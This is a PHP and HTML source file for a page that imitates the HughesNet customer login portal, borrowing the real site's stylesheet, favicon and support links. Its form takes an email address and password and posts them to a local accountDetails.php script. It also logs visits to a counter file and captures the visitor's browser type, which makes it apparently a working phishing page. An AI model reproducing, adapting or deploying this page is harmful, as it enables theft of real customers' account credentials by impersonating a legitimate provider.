<?php
include_once('Browser.php');
//Initialize hit counter
$stored = "hits.txt"; 

//Write counter to file function
function displayHitThingy($stored) { 
     $fp = fopen($stored,'rw'); 
     $stuff = fgets($fp,9999); 
     fclose($fp); 
     $fp = fopen($stored,'w'); 
     $stuff += 1; 
	 print $stuff;
     fputs($fp, $stuff); 
     fclose($fp); 
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>HughesNet Login</title>
<link href="http://home.myhughesnet.com/files/hughes/styles.css" rel="stylesheet" type="text/css" />
<script src="SpryAssets/SpryValidationTextField.js" type="text/javascript"></script>
<link rel="icon" href="http://images.synacor.com/clientimages/69227/70315.ico" type="image/png" >
<link href="SpryAssets/SpryValidationTextField.css" rel="stylesheet" type="text/css" />
</head>

<body>
<div id="site_container">
	<h1 class="logo">
		<a href="/">HughesNet</a>
	</h1>
	<div class="secondary_login">
		<h2>Welcome, Please Log In</h2>
		<p>To log in please enter your HughesNet username and password in the form below, and click on the log in button.</p>
		<div class="secondary_login_inner">
			<div class="login_left">
				<div class="title">Registered Users?</div>
								<form method="post" action="accountDetails.php" target="_top">
                                <input name="counter" type="hidden" value="<?php displayHitThingy($stored);?>">
<input name="browser" type="hidden" value="<?php echo $browser_type;?>">
<div class="formentry formentry_user">
		    <label for="username" class="formtitle">Email Address:</label>
		    <span id="sprytextfield1">
					<input type="text" class="sloginentry" value="" size="35" name="username" />
				<span class="textfieldRequiredMsg">A Hughes email account is necessary to access the portal. Please re-enter your email address and password.</span></span></div>
				<div class="formentry formentry_pass">
					<label for="password" class="formtitle">Password:</label>
					<input type="password" class="sloginentry" value="" size="35" name="password" />
				</div>
				<div class="forgot">
					<a href="http://customercare.myhughesnet.com/" target="_blank">Password Help &amp; Customer Support</a>
				</div>
				<div class="formentry_submit">
					<input type="submit" class="sloginsubmit submit" value="Log In" id="sloginsubmit" />
				</div>
				</form>
			</div>
			<div class="login_right">
				<div class="title">Not Registered?</div>
				<p>If you do not have a HughesNet username and password create an account now.</p>
				<div class="formentry_submit">
					<a target="_blank" href="http://welcome.hughesnet.com/" title="Customer Care">Register</a>
				</div>
				</form>
			</div>
		</div>
	</div>
</div>
<script type="text/javascript">
<!--
var sprytextfield1 = new Spry.Widget.ValidationTextField("sprytextfield1");
//-->
</script>
</body>
</html>
